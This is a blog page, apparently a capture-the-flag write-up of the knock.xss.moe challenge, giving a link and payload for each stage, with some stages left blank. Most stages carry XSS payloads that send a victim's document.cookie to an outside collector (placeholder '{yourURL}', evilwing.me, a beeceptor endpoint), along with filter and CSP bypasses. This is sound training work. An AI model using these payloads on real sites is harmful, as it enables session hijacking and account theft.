@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="description" content="">
+    <meta property="og:title" content="[knock.xss.moe] XSS CHALLENGE">
+    
+    <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2019-01-06">
+    
+    <meta property="og:description" content="">
+    <meta property="og:url" content="https://saddean.github.io/blogs/post/knock-xss/">
+    <meta property="og:site_name" content="S4D&#39;s Blog">
+    
+    <meta property="og:tags" content="XSS">
+    
+    <meta property="og:tags" content="knock.xss.moe">
+    
+    <meta property="og:tags" content="writeup">
+    
+    <meta name="generator" content="Hugo 0.52" />
+    <title>[knock.xss.moe] XSS CHALLENGE &middot; S4D&#39;s Blog</title>
+    
+    <link rel="stylesheet" href="https://saddean.github.io/blogs/css/monokai-sublime.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    
+    <link rel="stylesheet" href="https://saddean.github.io/blogs/css/style.css">
+    <link rel="stylesheet" type="text/css" href="https://csshake.surge.sh/csshake.min.css">
+    
+    <link href="https://saddean.github.io/blogs/index.xml" rel="alternate" type="application/rss+xml" title="S4D&#39;s Blog" />
+    
+    
+    <link rel="icon" href="https://saddean.github.io/blogs/icon.ico" />
+    
+
+    
+    
+</head>
+
+<body>
+<nav class="navbar navbar-default navbar-fixed-top visible-xs">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+				<a class="navbar-brand" href="https://saddean.github.io/blogs/">$4D</a>
+			
+		</div>
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				
+				
+					<li><a href="https://saddean.github.io/blogs/about">About</a></li>
+				
+					<li><a href="https://saddean.github.io/blogs/">Blog</a></li>
+				
+					<li><a href="https://saddean.github.io/blogs/tags/">Category</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</nav>
+<div class="container-fluid">
+	<div class="row">
+		<div id="menu" class="hidden-xs col-sm-2 col-md-2">
+	<div id="menu-content" class="vertical-align">
+		
+			<h2 class="text-center rainbox-text shake-opacity"><a href="https://saddean.github.io/blogs/">$4D</a></h2>
+		
+		
+		
+			<small class="text-center center-block">🚀 Người đi ra ngoài vũ trụ 🚀</small>
+		
+		
+		
+			<img id="profile-pic" src="https://saddean.github.io/blogs//img/profile.jpg" alt="My Picture" class="img-circle center-block">
+		
+		<div id="social" class="text-center">
+			
+				<a href="https://github.com/saddean"><i class="shake-opacity fa fa-github fa-3x"></i></a>
+			
+				<a href="https://twitter.com/ttuongann"><i class="shake-opacity fa fa-twitter fa-3x"></i></a>
+			
+				<a href="https://facebook.com/ttuongann"><i class="shake-opacity fa fa-facebook fa-3x"></i></a>
+			
+
+			
+		</div>
+		<div id="links" class="text-center">
+			
+			
+				<a href="https://saddean.github.io/blogs/about">About</a>
+			
+				<a href="https://saddean.github.io/blogs/">Blog</a>
+			
+				<a href="https://saddean.github.io/blogs/tags/">Category</a>
+			
+		</div>
+	</div>
+</div>
+
+		<div id="content" class="col-xs-12 col-sm-8 col-md-10">
+			<div class="row">
+				<div id="post" class="col-sm-offset-1 col-sm-10 col-md-10 col-lg-9">
+
+<main>
+	<header>
+		<h1 class="title-h1">[knock.xss.moe] XSS CHALLENGE</h1>
+		<div>
+			Published on: <i class="hg-muted">6 January 2019</i>
+		</div>
+		<div>
+			<i>Tags:</i>
+			<small class="text-muted">
+				
+				
+				<a href="https://saddean.github.io/blogs/tags/xss"><span class="label btn-warning shake-opacity">XSS</span></a>
+				
+				<a href="https://saddean.github.io/blogs/tags/knock.xss.moe"><span class="label btn-warning shake-opacity">knock.xss.moe</span></a>
+				
+				<a href="https://saddean.github.io/blogs/tags/writeup"><span class="label btn-warning shake-opacity">writeup</span></a>
+				
+			</small>
+		</div>
+	</header>
+
+	<article>
+		
+
+<hr />
+
+<blockquote>
+<p><strong>XSS</strong>:<br>
+Cross-Site Scripting (XSS) là một trong những kĩ thuật tấn công phổ biến nhất hiên nay, đồng thời nó cũng là một trong những vấn đề bảo mật quan trọng đối với các nhà phát triển web và cả những người sử dụng web. Bất kì một website nào cho phép người sử dụng đăng thông tin mà không có sự kiểm tra chặt chẽ các đoạn mã nguy hiểm thì đều có thể tiềm ẩn các lỗi XSS.</p>
+
+<ul>
+<li><strong>Link Challage</strong>: <a href="https://knock.xss.moe">https://knock.xss.moe</a></li>
+<li><strong>Rule</strong>: Send link to bot and get cookie!!!</li>
+<li><strong>Link Request</strong> : <code>xxxxx.knock.xss.moe/?q=payload</code></li>
+<li><strong>Thanks for</strong> : <a href="https://www.youtube.com/watch?v=rpHhM2X5jd8">https://www.youtube.com/watch?v=rpHhM2X5jd8</a></li>
+</ul>
+</blockquote>
+
+<hr />
+
+<h1 id="stage1-tutorial">Stage1[Tutorial]</h1>
+
+<ul>
+<li>Link : <a href="http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/">http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/</a></li>
+<li>Payload : <code>location=%22http://example.com/?%22%2Bdocument.cookie</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage2">Stage2</h1>
+
+<ul>
+<li>Link : <a href="http://1a31198b4289ff3af4f7195a810c48eba9f6bf28.knock.xss.moe/?q=XSS">http://1a31198b4289ff3af4f7195a810c48eba9f6bf28.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>&lt;script&gt;location='{yourURL}/?se='%2Bdocument.cookie&lt;/script&gt;</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage3">Stage3</h1>
+
+<ul>
+<li>Link : <a href="http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q=XSS">http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>&quot;&gt;&lt;script&gt;location='{yourURL}/?se='%2Bdocument.cookie&lt;/script&gt;</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage4">Stage4</h1>
+
+<ul>
+<li>Link : <a href="http://2375e1f80fe2ec262a235d594fbcee96dba66710.knock.xss.moe/?q=XSS">http://2375e1f80fe2ec262a235d594fbcee96dba66710.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>'&quot;&gt;&lt;/a&gt;&lt;script&gt;location='{yourURL}/?se='%2Bdocument.cookie&lt;/script&gt;</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage5">Stage5</h1>
+
+<ul>
+<li>Link : <a href="http://fea7c73bbe92f7880fc15514e076e838d2ce8a90.knock.xss.moe/?q=XSS">http://fea7c73bbe92f7880fc15514e076e838d2ce8a90.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>&lt;/textarea&gt;&lt;script&gt;location='{yourURL}/?se='%2Bdocument.cookie&lt;/script&gt;</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage6">Stage6</h1>
+
+<ul>
+<li>Link : <a href="http://d82fe27901fa05dcfa8980262fc811645543e374.knock.xss.moe/?q=XSS">http://d82fe27901fa05dcfa8980262fc811645543e374.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>&lt;/xmp&gt;&lt;script&gt;location='{yourURL}/?se='%2Bdocument.cookie&lt;/script&gt;</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage7">Stage7</h1>
+
+<ul>
+<li>Link : <a href="http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=XSS">http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>XSS&quot; onfocus=&quot;location=`yourURL/?se=${document.cookie}`&quot; autofocus=&quot;</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage8">Stage8</h1>
+
+<ul>
+<li>Link : <a href="http://b65797d44372ecb2b2552e32f10ec75f1bddcca6.knock.xss.moe/?q=XSS">http://b65797d44372ecb2b2552e32f10ec75f1bddcca6.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>&quot;XSS' onfocus=location=&quot;{yourURL}/?se=&quot;%2Bdocument.cookie autofocus='&quot;</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage9">Stage9</h1>
+
+<ul>
+<li>Link : <a href="http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS">http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>XSS&quot; onfocus=location=&quot;{yourURL}/?se=&quot;.concat(document.cookie) autofocus&quot;</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage10">Stage10</h1>
+
+<ul>
+<li>Link : <a href="http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=XSS">http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>javascript:location=&quot;{yourURL}/?se=&quot;.concat(document.cookie)</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage11">Stage11</h1>
+
+<ul>
+<li>Link : <a href="http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=XSS">http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>javascript:top.location=&quot;{yourURL}/?se=&quot;.concat(document.cookie)</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage12">Stage12</h1>
+
+<ul>
+<li>Link :</li>
+<li>Payload :</li>
+</ul>
+
+<hr />
+
+<h1 id="stage20">Stage20</h1>
+
+<ul>
+<li>Link : <a href="http://303f34eb0a974a432254a4cb2d6e07fa6f8b0b7f.knock.xss.moe/?q=XSS">http://303f34eb0a974a432254a4cb2d6e07fa6f8b0b7f.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>&lt;scripscriptt&gt;location='{yourURL}/?se='.concat(document.cookie)&lt;/scripscriptt&gt;</code></li>
+<li>Note : bypass script</li>
+</ul>
+
+<hr />
+
+<h1 id="stage21">Stage21</h1>
+
+<ul>
+<li>Link : <a href="http://49ab9ff165cd76ffe06af0b72f450c82f35db396.knock.xss.moe/?q=xss">http://49ab9ff165cd76ffe06af0b72f450c82f35db396.knock.xss.moe/?q=xss</a></li>
+<li>Payload : <code>&lt;scripT&gt;javascript:location='{yourURL}/?se='.concat(document.cookie)&lt;/scripT&gt;</code></li>
+<li>Note : <code>Content-Security-Policy: script-src 'self' 'unsafe-inline'</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage22">Stage22</h1>
+
+<ul>
+<li>Link : <a href="http://bcd699e871d46c191f3c43a7197c18440b308507.knock.xss.moe/">http://bcd699e871d46c191f3c43a7197c18440b308507.knock.xss.moe/</a></li>
+<li>Payload : <code>&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;#location='{yourURL}/?se='+document.cookie</code></li>
+<li>Note : Limit 65 character in script tag 🍌</li>
+<li>Different way: Using shorten link your host, In your host:</li>
+</ul>
+
+<pre><code class="language-javascript">    &lt;script&gt;
+        window.name = &quot;location.href='http://evilwing.me:5000/?'+document.cookie&quot;;
+        location.href = &quot;http://bcd699e871d46c191f3c43a7197c18440b308507.knock.xss.moe/?q=%3Csvg/onload=eval(name)%3E&quot;;
+    &lt;/script&gt;
+</code></pre>
+
+<hr />
+
+<h1 id="stage23">Stage23</h1>
+
+<ul>
+<li>Link : <a href="http://51b123fbd6a21b3cf43f49e0a1014221e191c7db.knock.xss.moe/?q=XSS">http://51b123fbd6a21b3cf43f49e0a1014221e191c7db.knock.xss.moe/?q=XSS</a></li>
+<li>Payload : <code>&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;#location='{yourURL}/?se='+document.cookie</code></li>
+<li>Note : Limit 55 character 🍌</li>
+</ul>
+
+<hr />
+
+<h1 id="stage24">Stage24</h1>
+
+<ul>
+<li>Link : <a href="http://1498f071159fd60222c0e7e82b7b6ff046e9e52e.knock.xss.moe/">http://1498f071159fd60222c0e7e82b7b6ff046e9e52e.knock.xss.moe/</a></li>
+<li>Payload : <code>&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;#location='{yourURL}/?se='+document.cookie</code></li>
+<li>Note : Limit 45 character  🍌</li>
+</ul>
+
+<hr />
+
+<h1 id="stage25">Stage25</h1>
+
+<ul>
+<li>Link : <a href="http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/">http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/</a></li>
+<li>Payload : ``</li>
+<li>Note : Limit 35 character input 🌶🌶</li>
+<li>Thanks for : <code>https://daoduythuan.github.io/knock-xss-moe/</code></li>
+</ul>
+
+<hr />
+
+<h1 id="stage26">Stage26</h1>
+
+<ul>
+<li>Link : <a href="http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/</a></li>
+<li>Pre-Pre-Payload : <code>&lt;svg onload=location=&quot;https://xss12.free.beeceptor.com/?se=&quot;.concat(document.cookie)</code></li>
+<li>Payload : Pre-Pre-Payload &ndash;HTMLCHARACTER&ndash;&gt; Pre-Payload &ndash;URLENCODE&ndash;&gt; PAYLOAD</li>
+</ul>
+
+<hr />
+
+<h1 id="stage27">Stage27</h1>
+
+<ul>
+<li>Link : <a href="http://295a1d900c5bf618101abf69083622d0f69aded1.knock.xss.moe/">http://295a1d900c5bf618101abf69083622d0f69aded1.knock.xss.moe/</a></li>
+<li>💀 So Hard , TIME TO THINKING</li>
+</ul>
+
+	</article>
+</main>
+
+<div id="bottom-nav" class="text-center center-block">
+	<a href=" https://saddean.github.io/blogs/" class="btn btn-default"><i class="fa fa-home"></i> Home</a>
+</div>
+
+
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "myblog-wqnng8opme" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+  </div>
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-130213932-1', 'auto');
+    ga('send', 'pageview');
+    window.baseURL = "https:\/\/saddean.github.io\/blogs\/";
+  </script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.2/js/bootstrap.min.js"></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/topojson/1.6.9/topojson.min.js"></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
+  <script src="https://saddean.github.io/blogs//js/App.js"></script>
+  
+</body>
+</html>
